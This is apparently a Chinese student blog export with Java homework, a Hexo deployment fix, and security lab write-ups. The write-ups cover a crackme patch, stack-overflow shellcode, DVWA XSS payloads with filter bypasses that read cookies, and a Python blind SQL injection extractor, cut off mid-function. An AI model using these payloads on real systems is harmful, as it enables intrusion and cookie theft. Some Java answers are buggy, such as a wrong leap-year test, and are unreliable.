一般方法：修改编号、姓名，获取编号、姓名。 类Teacher：继承类Person并增加： 属性：系别； 构造方法：调用父类的构造方法； 一般方法：修改、获取系别。 类Student：继承类Person并增加： 属性：班级； 构造方法：调用父类的构造方法； 一般方法：修改、获取班级属性值。 类Classes： 属性：班级名称，学生名单(Student类对象的数组)； 构造方法：确定班级名称； 一般方法：建立学生名单，输出学生名单。 类Main：主类。主方法中创建一个班级，然后建立该班级的学生名单，最后输出学生名单。 person类 package hw3; public class person { int id; String name,gender; public person() { } public person(int id,String name) { this.id=id; this.name=name; } public void revise_id(int id) { this.id=id; } public void revise_name(String name) { this.name=name; } public int get_id() { return this.id; } public String get_name() { return this.name; } } teacher类 package hw3; public class teacher extends person { String faculty; public teacher() { } public teacher(int id,String name,String faculty) { super(id,name); this.faculty=faculty; } public void revise_facilty(String Faculty) { this.faculty=faculty; } public String get_faculty() { return this.faculty; } } student类 package hw3; public class student extends person { String class_number; public student(int id,String name,String class_number) { super(id,name); this.class_number=class_number; } public void revise_class_number(String class_number) { this.class_number=class_number; } public String get_class_number() { return this.class_number; } } classes类 package hw3; public class classes { String class_name; student student_list[]; int student_number; teacher teacher; public classes(String class_name,teacher tec) { this.class_name=class_name; this.teacher=tec; } public void set_student_list(student student_list[],int student_number) { this.student_list=student_list; this.student_number=student_number; } public void print_student_list() { System.out.println(&quot;班级名称是：&quot;+&quot;\t&quot;+this.class_name); System.out.println(&quot;任课教师是：&quot;+&quot;\t&quot;+this.teacher.name); System.out.println(&quot;学生名单如下：&quot;); int i; for(i=0;i&lt;this.student_number;i++) { System.out.println(&quot;\t&quot;+&quot;姓名：&quot;+&quot;\t&quot;+this.student_list[i].name+&quot;\t&quot;+&quot;学号:&quot;+&quot;\t&quot;+this.student_list[i].id); } } } main类 package hw3; import java.util.*; public class main_class { public static void main(String[] args) { Scanner s=new Scanner(System.in); System.out.println(&quot;请输入班级名称：&quot;); String cn=s.nextLine(); System.out.println(&quot;请输入任课老师姓名和院系&quot;); teacher tec=new teacher(); tec.revise_name(s.nextLine()); tec.revise_facilty(s.nextLine()); classes banji=new classes(cn,tec); System.out.println(&quot;请输入学生人数：&quot;); int n; n=s.nextInt(); student stu[]=new student[n]; int i; System.out.println(&quot;请输入学生学号和姓名:&quot;); for(i=0;i&lt;n;i++) { stu[i]=new student(s.nextInt(),s.nextLine(),cn); } banji.set_student_list(stu, n); banji.print_student_list(); } } QSc77t.png 🚩推荐阅读java第四次实验作业java第三次实验作业java第二次实验作业java一键安装所有环境，vscode做到了！java笔记1]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java实验二]]></title>
    <url>%2F2019%2F11%2F26%2Fjava-shiyan-2%2F</url>
    <content type="text"><![CDATA[java实验二。 问题1、 打印一个三角形的1~9的乘法表。 package hw2; public class chenfa { public static void main(String[] args) { System.out.print(&quot;*&quot;+&quot;\t&quot;); int i; for(i = 1;i &lt;= 9;i++) { System.out.print(i+&quot;\t&quot;); } System.out.println(); int x,y; for(x = 1;x &lt;= 9;x++) { System.out.print(x+&quot;\t&quot;); for(y = 1;y &lt;= x; y++) { System.out.print(x*y+&quot;\t&quot;); } System.out.println(); } } } QSrMrt.png 问题2、编写一程序，将从键盘输入的每个月份数(整数)显示出其对应的英文，直至输入0结束，注意对非法数据的处理。 (while,switch语句) package hw2; import java.util.*; public class two { public static void main(String[] args) { Scanner s=new Scanner(System.in); System.out.println(&quot;请输入月份&quot;); int m; while(true) { m=s.nextInt(); if(m==0) { System.out.println(&quot;输入结束&quot;); break; } switch(m) { case 1:System.out.println(&quot;January&quot;);break; case 2:System.out.println(&quot;February&quot;);break; case 3:System.out.println(&quot;March&quot;);break; case 4:System.out.println(&quot;April&quot;);break; case 5:System.out.println(&quot;May&quot;);break; case 6:System.out.println(&quot;June&quot;);break; case 7:System.out.println(&quot;July&quot;);break; case 8:System.out.println(&quot;August&quot;);break; case 9:System.out.println(&quot;September&quot;);break; case 10:System.out.println(&quot;October&quot;);break; case 11:System.out.println(&quot;November&quot;);break; case 12:System.out.println(&quot;December&quot;);break; default:System.out.println(&quot;非法字符&quot;);break; } } } } QSrJPg.png 问题3、打印图案：一个由n行星花组成的三角形。如n=5时的图案为： package hw2; import java.util.*; public class three { public static void main(String[] args) { Scanner s=new Scanner(System.in); int n; System.out.println(&quot;请输入行数&quot;); n=s.nextInt(); int x,y,z; for(x=1;x&lt;=n;x++) { for(y=1;y&lt;=n-x;y++) { System.out.print(&quot; &quot;); } for(z=1;z&lt;=x;z++) { System.out.print(&quot;* &quot;); } System.out.println(); } } } QSrrIU.png 问题4、打印出所有的“水仙花数”。所谓“水仙花数”是指一个三位数，其各位数字的立方和等于该数本身。例如153是一个“水仙花数”，因为153=13+53+33。 package hw2; import java.util.*; public class four { public static void main(String[] args) { //Scanner s=new Scanner(System.in); System.out.println(&quot;水仙花数为：&quot;); int x; for(x=100;x&lt;=999;x++) { double sum; sum=Math.pow(x/100,3)+Math.pow((x%100)/10,3)+Math.pow(x%10,3); if(sum==x) { System.out.println(x); } } } } QSrveP.png 问题5、编写一个程序，从键盘读一个年份的数字，然后判断该年是否是闰年，如果是就输出“闰年”，如果不是就输出“非闰年”。 package hw2; import java.util.*; public class five { static boolean panduan(int x) { if(x%400==0) return true; if(x%420==0&amp;&amp;x%100!=0) return true; return false; } public static void main(String[] args) { Scanner s=new Scanner(System.in); System.out.println(&quot;请输入年份&quot;); int year; year=s.nextInt(); if(panduan(year)) { System.out.println(year+&quot;年 是闰年&quot;); } else { System.out.println(year+&quot;年 是非闰年&quot;); } } } QSskyn.png 问题6、统计个位数是6，并且能被3整除的五位数共有多少个。 package hw2; public class six { public static void main(String[] args) { int x; int sum=0; for(x=10000;x&lt;=99999;x++) { if(x%10==6&amp;&amp;x%3==0) { sum++; } } System.out.println(&quot;个位数是6，并且能被3整除的五位数共有&quot;+sum+&quot;个&quot;); } } QSsKW4.png 问题7、编写一个程序，在其中建立一个有10个整数的数组，运行后从键盘输入10个数，然后输出其中的最小数。 package hw2; import java.util.*; public class seven { public static void main(String[] args) { Scanner s=new Scanner(System.in); System.out.println(&quot;请输入10个数&quot;); int a[]=new int[10]; int i; for(i=0;i&lt;10;i++) { a[i]=s.nextInt(); } Arrays.sort(a); for(i=0;i&lt;10;i++) { System.out.print(a[i]+&quot;\t&quot;); } } } QSsB6A.png 问题8、编写一个程序，在其中定义一个6´6的二维整型数组, 利用随机函数产生36个10~20之间的随机整数放入，然后将数组输出到屏幕上(6行6列格式)。最后计算出数组中对角线元素的平方根和。 package hw2; import java.util.*; public class erweishuzu { public static void main(String[] args) { int a[][]=new int[6][6]; int i,j; for(i=0;i&lt;6;i++) { for(j=0;j&lt;6;j++) { a[i][j]=(int)(10+Math.random()*10); System.out.print(a[i][j]+&quot; &quot;); } System.out.println(); } double sum=0; int l; for(l=0;l&lt;6;l++) { sum=sum+Math.sqrt(a[l][l])+Math.sqrt(a[5-l][l]); } System.out.println(&quot;平方根和为：&quot;+sum); } } QS6Qq1.png 🚩推荐阅读java第四次实验作业java第三次实验作业java第二次实验作业java一键安装所有环境，vscode做到了！java笔记1]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo发生error：spawn failed错误的解决方法]]></title>
    <url>%2F2019%2F11%2F24%2Fspawn-failed%2F</url>
    <content type="text"><![CDATA[hexo突然上传不了，出错了。 今天hexo突然部署不了文章了，错误页面如下。 MO2Q8s.png 然后就去github仓库看了一下，发下之前的ssh key没了，重新设了一个也连接不上。最后找到一个方法。 在存放key的目录下新建config文件。 MO22Ie.png 填入以下内容 Host github.com User 你GitHub的邮箱 Hostname ssh.github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa Port 443 然后用 ssh -T git@github.com命令测试能否连接 如果没有出现ssh不能连接的话，忽略以上内容 接着回到博客的根目录 第一种方法： 删除.deploy_git文件 然后输入git config --gloabl core.autocrlf false 重新hexo clean hexo g hexo d 部署 但是发现好像只是一次性的。并不能永久解决 第二种方法： 打开_config.yml配置文件 修改以下内容 deploy: type: git repo: https://github.com/yourname/yourname.github.io.git branch: master 其中的repo修改为 git@github.com:yourname/yourname.github.io.git 🚩推荐阅读我的Qzone五周年记录]]></content>
      <categories>
        <category>记录</category>
      </categories>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网安作业3]]></title>
    <url>%2F2019%2F11%2F19%2F%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A3%2F</url>
    <content type="text"><![CDATA[网安作业3. crackme:打开IDA找到判断跳转语句位置 MReyX4.png 修改跳转指令 MReocD.png 应用到程序 MReOAI.png 运行结果： 正确密码显示错误，错误密码显示正确。 MRmkEn.png overflow(1):首先输入7个q看一下栈情况 Mqgxu8.png authenticated的值是1 输入8个q 没有执行前，authenticated的值还是1 Mq2JKK.png 执行以后，值被覆盖为0 Mq2UVe.png overflow(2):将跳转地址覆盖为验证通过的地址 Mq2qZF.png 用ultraedit编辑password文件，任意填充8字符覆盖password，4字符覆盖authenticated，4字符覆盖上一栈帧的ebp,填入4个字符返回地址。 MqRldg.png 再运行程序 MqRweU.png overflow(3):程序与2的区别是增加了头文件windows.h，buff由8字节变成44字节，有足够空间填入代码。 找到buff地址和返回地址 MLYJ5F.png 找到messageboxA入口地址 #include &lt;stdio.h&gt; #include &lt;windows.h&gt; typedef void (*FuncPointer)(LPTSTR); // 函数指针 int main() { HINSTANCE LibHandle; FuncPointer GetAddr; // 加载成功后返回库模块的句柄 LibHandle = LoadLibrary(&quot;user32&quot;); printf(&quot;user32 LibHandle = 0x%X\n&quot;, LibHandle); // 返回动态链接库(DLL)中的输出库函数地址 GetAddr=(FuncPointer)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;); printf(&quot;MessageBoxA = 0x%X\n&quot;, GetAddr); return 0; } MLt0zj.png 构造password 机器码 汇编指令 解释 33DB XOR EBX,EBX 将EBX寄存器置为NULL 53 PUSH EBX 686A6F6B65 PUSH 656b6f6a Thisjoke 6854686973 PUSH 73696854 8BC4 MOV EAX,ESP EAX里存入字符串指针 53 PUSH EBX 50 PUSH EAX 50 PUSH EAX 53 PUSH EBX B8301D3148 MOV EAX,0x48311D30 调用MessageBoxA FFD0 CALL EAX MLLowj.png 由于win10保护机制太强，没有办法显示messagebox 换到xp系统上实现 先找到messageboxA的入口地址 MLOene.png 再找到buff起始地址 MLO8c8.png MLON7j.png MLOsjU.png 定位shellcode，找jmp esp指令 #include &lt;windows.h&gt; #include &lt;stdio.h&gt; #define DLL_NAME &quot;user32.dll&quot; main() { BYTE* ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) { printf(&quot; load dll erro !&quot;); exit(0); } ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) { try { if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4) { //0xFFE4 is the opcode of jmp esp int address = (int)ptr + position; printf(&quot;OPCODE found at 0x%x\n&quot;,address); } } catch(...) { int address = (int)ptr + position; printf(&quot;END OF 0x%x\n&quot;, address); done_flag = true; } } } MLzBOf.png 定位exitprocess入口地址 #include &lt;stdio.h&gt; #include &lt;windows.h&gt; typedef void (*FuncPointer)(LPTSTR); // 函数指针 int main() { HINSTANCE LibHandle; FuncPointer GetAddr; // 加载成功后返回库模块的句柄 LibHandle = LoadLibrary(&quot;kernel32&quot;); printf(&quot;kernel32 LibHandle = 0x%X\n&quot;, LibHandle); // 返回动态链接库(DLL)中的输出库函数地址 GetAddr=(FuncPointer)GetProcAddress(LibHandle,&quot;ExitProcess&quot;); printf(&quot;ExitProcess = 0x%X\n&quot;, GetAddr); return 0; } MLzqh9.png 修改password文件 机器码 汇编指令 解释 33DB XOR EBX,EBX 将EBX寄存器置为NULL 53 PUSH EBX 686A6F6B65 PUSH 656b6f6a Thisjoke 6854686973 PUSH 73696854 8BC4 MOV EAX,ESP EAX里存入字符串指针 53 PUSH EBX 50 PUSH EAX 50 PUSH EAX 53 PUSH EBX B8EA07D577 MOV EAX,0x77D507EA 调用MessageBoxA FFD0 CALL EAX 53 PUSH EBX B8A2BF817C MOV EAX,0x7C81BFA2 调用exit（0） FFD0 CALL EAX MOC6uq.png 现在程序就可以正常退出 MOC58J.png]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA--xss_stored]]></title>
    <url>%2F2019%2F11%2F14%2Fxss-stored%2F</url>
    <content type="text"><![CDATA[DVWA的存储型xss。 级别：lowStored XSS Source&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 分析 isset() 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim() 函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes() 函数用于删除字符串中的反斜杠 mysqli_real_escape_string() 函数会对字符串中的特殊号(\x00，\n，\r，\，&#39;，&quot;，\x1a) 进行转义 在代码中对message，name输入框内容 没有进行XSS方面的过滤和检查 且通过 query 语句插入到数据库中。所以存在存储型XSS漏洞 方法由于name和message输入框均存在xss。但name输入框有字符限制，这里可以使用burpsuite抓包修改name输入框内容： &lt;script&gt;alert(document.cookie)&lt;/script&gt; MUAK3Q.png MUAQjs.png MUA1un.png 由于提交的结果存储在数据库中，所以每次刷新页面，输入的恶意代码就会被执行一次 级别：mediumStored XSS Source &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 分析 strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 方法 抓包修改name输入内容: 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如 &lt;IMG src=1 onerror=alert(document.cookie)&gt; MUmpy4.png 由于low级别已经注入过，所以打开medium级别会直接弹出cookie 级别：highStored XSS Source&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 分析和上面两个级别一样，抓包修改name内容即可，代码对name输入内容利用正则匹配删除所有关于&lt;script&gt;标签 方法抓包修改name内容为 &lt;IMG src=1 onerror=alert(document.cookie)&gt; 🚩推荐阅读DVWA--xss_reflected]]></content>
      <categories>
        <category>xss攻击</category>
      </categories>
      <tags>
        <tag>xss攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA--xss_reflected]]></title>
    <url>%2F2019%2F11%2F14%2Fxss-reflected%2F</url>
    <content type="text"><![CDATA[DVWA上的反射型xss。 级别：lowReflected XSS Source &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt; 分析 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。 输入 &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; MNT1gJ.png 查看源码可以发现代码被解释执行了 MNTa4O.png 获取cookie输入 &lt;script&gt;alert(document.cookie)&lt;/script&gt; MNTxxJ.png 级别：mediumReflected XSS Source &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Get input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 分析 Medium级别的代码相对于Low级别的代码使用str_replace函数将输入中的&lt;script&gt;删除 方法 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入 &lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如&lt;IMG src=1 onerror=alert(document.cookie)&gt; 结果： MNH1mR.png 级别：highReflected XSS Source &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Get input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 分析 可以看到High级别的代码使用了 preg_replace 函数执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 方法&lt;script&gt; 标签不管用了，但是可以使用其他标签绕过 输入 &lt;IMG src=1 onerror=alert(document.cookie)&gt; MNbeHI.png 🚩推荐阅读DVWA--xss_stored]]></content>
      <categories>
        <category>xss攻击</category>
      </categories>
      <tags>
        <tag>xss攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-SQL_Injection_Blind（sql盲注）]]></title>
    <url>%2F2019%2F11%2F12%2FDVWA-SQL-Injection-Blind%2F</url>
    <content type="text"><![CDATA[DVWA的sql盲注。 SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 盲注中常用的几个函数： substr(a,b,c)：从b位置开始，截取字符串a的c长度 count()：计算总数 ascii()：返回字符的ascii码 length()：返回字符串的长度 left(a,b)：从左往右截取字符串a的前b个字符 sleep(n):将程序挂起n秒 手工盲注思路 手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。 盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。 下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）： 1.判断是否存在注入，注入是字符型还是数字型 2.猜解当前数据库名 3.猜解数据库中的表名 4.猜解表中的字段名 5.猜解数据 级别：lowSQL Injection (Blind) Source&lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Get input $id = $_GET[ &#39;id&#39; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析： Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种： User ID exists in the database.与 User ID is MISSING from the database. 所以这里是SQL盲注漏洞。 漏洞利用 输入1 ，发现 输入 1’， 发现 观察到他这里只会出现正确或者错误的两种页面，判定他是一个布尔盲注 获取数据库长度 def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process(&#39;get_database_length&#39;,i,30) theurl = self.url + &quot;1&#39; and length(database())={0}%23&quot;.format(str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print(&#39;\n==&gt;&#39;,self.database_length) else: print(&quot;\ncan not get the database_length&quot;) 运行结果： MGOfVP.png 检查页面是否正常 def check(self,text): if &quot;User ID exists in the database.&quot; in text: return True elif &quot;User ID is MISSING from the database.&quot; in text: return False 获取数据库名 def get_database(self): self.database = &#39;&#39; for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + &#39; get_database&#39;,j,self.database_length+1) theurl = self.url + &quot;1&#39; and ascii(substring(database(),{0},1))={1}%23&quot;.format(str(i),str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += &#39;666&#39; if len(self.database) &gt; 0: print(&#39;\n==&gt;&#39;,self.database) else: print(&quot;\n can not get the database&quot;) 运行结果： MGjklQ.png 获取表长 def get_table_length(self): for i in range(1,50): self.process(&#39;get_table_length&#39;,i,50) theurl = self.url + &quot;1&#39; and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23&quot;.format(str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print(&#39;\n==&gt;&#39;,self.table_length) else: print(&#39;\ncan not get the table_length&#39;) 运行结果： MGjdfO.png 获取表名 def get_table_name(self): name = &#39;&#39; for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_table_name&#39;.format(i),j,50) theurl = self.url + &quot;1&#39; and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23&quot;.format(str(i),str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) &gt; 0: print(&#39;\n==&gt;&#39;,name) self.table_name.append(name) else: print(&#39;\ncan not get the table_name&#39;) 运行结果： MJie0g.png 获取表列数量 def get_column_num(self,table_name): self.column_num = 0 for i in range(1,30): self.process(&#39;get_column_num&#39;,i,30) theurl = self.url + &quot;1&#39; and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name=&#39;{0}&#39; having a={1})%23&quot;.format(table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print(&#39;\n==&gt;&#39;,self.column_num) 获取总长度 def get_column_length(self,table_name): for i in range(1,100): self.process(&#39;get_column_length&#39;,i,100) theurl = self.url + &quot;1&#39; and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name=&#39;{0}&#39; having a={1})%23&quot;.format(table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print(&#39;\n==&gt;&#39;,self.column_length) else: print(&#39;\ncan not get the column_length&#39;) 获取列名 def get_column_name(self,table_name): name = &#39;&#39; for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process(&#39;{0} get_column_name&#39;.format(str(i)),j,100) theurl = self.url + &quot;1&#39; and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name=&#39;{1}&#39; having a={2})%23&quot;.format(str(i),table_name,str(j)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += &#39;|&#39; if len(name) == self.column_length[0]: self.column_name.append(name) print(&#39;\n==&gt;&#39;,self.column_name[0]) else: print(&#39;\ncan not get the column_name&#39;) 运行结果： MJFlUH.png 获取字段数目 def get_word_num(self,table_name,column_name): for i in range(1,100): self.process(&#39;get_word_num&#39;,i,30) theurl = self.url + &quot;1&#39; and (select count({0}) as a from {1} having a={2})%23&quot;.format(column_name,table_name,str(i)) + &quot;&amp;Submit=Submit#&quot; html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print(&#39;\n==&gt;&#39;,self.word_num) else: print(&#39;\ncan not get the word_num&#39;) 获取列长 def get_word_length(self,table_name,column_name): for i in range(1,200): self.process(&#39;get_{0}_length&#39;.format(column_name),i,200) theurl = self.url + &quot;1&#39; and (select length(group_concat({0})) as a from {1} having a={2})%23&quot;.format(column_name,table_name,str(i)) + 